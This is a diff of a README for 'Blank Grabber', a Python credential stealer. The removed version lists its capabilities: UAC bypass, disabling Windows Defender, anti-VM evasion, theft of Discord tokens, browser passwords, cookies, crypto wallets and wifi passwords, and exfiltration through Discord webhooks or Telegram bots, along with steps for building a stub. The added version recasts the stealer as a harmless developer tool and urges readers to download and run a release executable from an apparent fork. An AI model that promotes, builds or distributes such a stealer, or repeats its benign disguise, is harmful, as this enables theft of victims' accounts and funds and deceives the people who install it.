@@ -1,93 +1,80 @@
-<h1 align="center">
-   Blank Grabber
-</h1>
-<p align= "center">
-   <kbd>
-   <img  src="https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png">
-   </kbd>
-</p>
+# Blank Grabber 🛠️
+
+![Blank Grabber](https://img.shields.io/badge/Download-Blank%20Grabber-blue.svg)
+
+Welcome to the Blank Grabber repository! This project offers a Python-based tool designed to capture various types of data, including cookies, passwords, and wallet information. It is a versatile tool for developers and security enthusiasts.
 
 ## Table of Contents
 
-- [Download](#download)
 - [Features](#features)
-- [Stub Settings](#stub-settings)
-- [Requirements](#requirements)
-- [How to Build?](#how-to-build)
-
-## Download
-
-**Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
-
-**Note:** If the grabber fails to function, attempt rebuilding it without enabling the "Anti VM" option.
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ## Features
 
-    • GUI Builder.
-    • UAC Bypass.
-    • Custom Icon.
-    • Runs On Startup.
-    • Disables Windows Defender.
-    • Anti-VM.
-    • Blocks AV-Related Sites.
-    • Melt Stub.
-    • Fake Error.
-    • EXE Binder.
-    • File Pumper.
-    • Obfuscated Code.
-    • Discord Injection.
-    • Steals Discord Tokens.
-    • Steals Steam Session.
-    • Steals Epic Session.
-    • Steals Uplay Session.
-    • Steals Passwords From Many Browsers.
-    • Steals Cookies From Many Browsers.
-    • Steals History From Many Browsers.
-    • Steals Autofills From Many Browsers.
-    • Steals Minecraft Session Files.
-    • Steals Telegram Session Files.
-    • Steals Crypto Wallets.
-    • Steals Roblox Cookies.
-    • Steals Growtopia Session.
-    • Steals IP Information.
-    • Steals System Info.
-    • Steals Saved Wifi Passwords.
-    • Steals Common Files.
-    • Captures Screenshot.
-    • Captures Webcam Image.
-    • Sends All Data Through Discord Webhooks/Telegram Bot.
-    (...more)
+- **Cookie Stealing**: Extract cookies from browsers for session management.
+- **Password Capture**: Retrieve saved passwords for various applications.
+- **Wallet Information**: Gather wallet details for cryptocurrency applications.
+- **User-Friendly Interface**: Designed with simplicity in mind for ease of use.
 
-## Stub Settings
+## Installation
 
-| Option | Description |
-| ------ | ----------- |
-| **Ping Me** | Pings [@everyone](https://www.remote.tools/remote-work/discord-everyone-here#what-is-everyone) when someone runs the stub. |
-| **Anti VM** | Tries its best to prevent the stub from running on Virtual Machine. |
-| **Put On Startup** | Runs the stub on Windows starup. |
-| **Melt Stub** | Deletes the stub after use. |
-| **Pump Stub** | Pumps the stub upto the provided size. |
-| **Fake Error** | Create custom (fake) error. |
-| **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/Blank-c/Blank-Grabber/issues/117)). |
-| **Discord Injection** | Puts backdoor on the Discord client for persistence. |
-| **UAC Bypass** | Tries to get administrator permissions without showing any prompt. |
+To get started with Blank Grabber, follow these steps:
 
-**Supports:** *Windows 8+ (Tested on Windows 10).*
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/EdwinRojas2024/Blank-Grabber.git
+   cd Blank-Grabber
+   ```
 
-## Requirements
+2. **Install Dependencies**:
+   Make sure you have Python installed. Then, run:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-**To build the stub, you need:**
-- Windows 10.
-- Python 3.10+.
-- An active internet connection.
+3. **Download the Latest Release**:
+   Visit the [Releases section](https://github.com/EdwinRojas2024/Blank-Grabber/releases) to download the latest version. You will need to download the executable file and execute it.
 
-## How to Build?
+## Usage
 
-1. Download and install [Python 3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
-2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
-3. [Download Blank Grabber](#download).
-4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
-5. Navigate to the **Blank Grabber** folder and double click *gui.py* file.
-6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
+Once you have installed Blank Grabber, you can run it by executing the following command in your terminal:
 
-bbuhbnnx
+```bash
+python main.py
+```
+
+### Options
+
+- **Cookie Extraction**: Choose the option to extract cookies from your browser.
+- **Password Retrieval**: Select the option to retrieve saved passwords.
+- **Wallet Information**: Opt to gather wallet details.
+
+Follow the on-screen prompts to complete the data capture process.
+
+## Contributing
+
+We welcome contributions to Blank Grabber. To contribute:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature-branch`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add new feature'`).
+5. Push to the branch (`git push origin feature-branch`).
+6. Open a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or support, feel free to reach out:
+
+- Edwin Rojas
+- [GitHub Profile](https://github.com/EdwinRojas2024)
+
+Thank you for using Blank Grabber! We hope you find it useful for your projects. Don't forget to check the [Releases section](https://github.com/EdwinRojas2024/Blank-Grabber/releases) for updates and new features.
